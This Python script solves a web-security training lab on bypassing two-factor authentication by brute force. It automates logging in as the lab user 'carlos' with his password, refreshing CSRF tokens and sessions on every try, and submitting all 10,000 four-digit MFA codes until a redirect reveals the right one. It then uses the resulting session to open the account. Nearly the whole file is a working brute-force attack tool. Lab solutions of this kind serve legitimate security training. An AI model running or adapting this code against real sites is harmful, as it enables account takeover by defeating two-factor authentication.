#################################################################
#
# Lab: 2FA bypass using a brute-force attack
#
# Hack Steps: 
#      1. Fetch the login page
#      2. Get the session cookie and extract the csrf token
#      3. Login in as carlos
#      4. Get the new session
#      5. Fetch the login2 page
#      6. Extract the csrf token
#      7. Post the mfa-code
#      8. Repeat the process with all possbile numbers
#
#################################################################
import requests
import re
import time
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a5500b804568b18822d7e2300c300c2.web-security-academy.net"

SCRIPT_START_TIME = time.time()

def main():
    print("⦗#⦘ Brute forcing the mfa-code of carlos.. ")

    carlos_session = brute_force_mfa_code()

    if carlos_session != None:
        print(Fore.WHITE + "⦗#⦘ Fetching carlos profile.. ", end="", flush=True)
        cookies = { "session": carlos_session}
        fetch("/my-account", cookies)
        print(Fore.GREEN + "OK")
    else:
        print("\n⦗!⦘ Failed to get carlos session")

    elapsed_time = int((time.time() - SCRIPT_START_TIME) / 60)
    print(Fore.WHITE + "🗹 Finished in : " + Fore.YELLOW + str(elapsed_time) + " minutes")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "\n⦗!⦘ Failed to fetch " + path + " through exception")


def post_data(path, data, cookies = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "\n⦗!⦘ Failed to post data to " + path + " through exception")


def brute_force_mfa_code():
    for (counter, code) in enumerate(range(0, 10000)):
        login_page = fetch("/login") 
        
        session = login_page.cookies.get("session")  
        csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
        cookies = { 'session': session }
        data = { 'username': 'carlos', 'password': 'montoya', 'csrf': csrf_token }
        
        login_as_carlos = post_data("/login", data, cookies)

        session = login_as_carlos.cookies.get("session")  
        cookies = { 'session': session }

        login2_page = fetch("/login2", cookies)

        csrf_token = re.findall("csrf.+value=\"(.+)\"", login2_page.text)[0]  
        data = { "csrf": csrf_token, "mfa-code": f"{code:04}" }
        post_code = post_data("/login2", data, cookies)

        if post_code.status_code == 302:
            print(Fore.WHITE + "\nCorrect code: " + Fore.GREEN + f"{code:04}")
            carlos_session = post_code.cookies.get("session")
            return carlos_session
        else:
            print_progress(counter, 10000, code)


def print_progress(counter, total_counts, text):
    elapsed_time = (int((time.time() - SCRIPT_START_TIME) / 60))
    print(Fore.WHITE + "❯❯ Elapsed: " + Fore.YELLOW + str(elapsed_time) +
           Fore.WHITE + f" minutes || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:04}" +
           Fore.WHITE + " => " + Fore.RED + "Wrong", end='\r', flush=True)


if __name__ == "__main__":
    main()
